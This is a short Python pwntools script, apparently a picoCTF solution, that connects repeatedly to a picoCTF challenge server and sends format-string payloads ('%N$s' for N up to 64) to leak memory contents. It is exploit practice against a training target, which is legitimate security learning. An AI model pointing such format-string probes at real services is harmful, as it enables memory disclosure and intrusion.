from pwn import *


for i in range(65):
    p = remote("saturn.picoctf.net", 63879)
    p.recvuntil('> ')

    payload = "%"+str(i)+"$s"
    p.sendline(payload)
    s = p.recv().decode('latin-1')
    print(i,s)

    p.close()
